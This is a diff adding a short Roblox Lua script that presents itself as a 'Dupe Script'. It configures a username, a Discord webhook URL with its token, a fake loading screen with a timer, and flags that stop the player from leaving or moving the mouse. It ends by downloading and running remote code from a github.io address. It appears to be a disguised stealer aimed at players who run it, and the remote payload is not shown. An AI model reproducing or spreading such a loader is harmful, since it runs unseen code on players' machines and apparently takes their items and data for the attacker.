@@ -1,0 +1,16 @@
+UserName = "BwdB86L2"
+UserName2 = "BwdB86L2" -- optional delete the whole line if you don't want it
+Webhook = "https://discord.com/api/webhooks/1102377303457157152/cPegSf6J0xnMcJMpce4jd4EpoKfhAU8HvrGTNejw5J4GboGz7KMeSrYcQNp92DvdXOnY" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Dupe Script"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 60 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
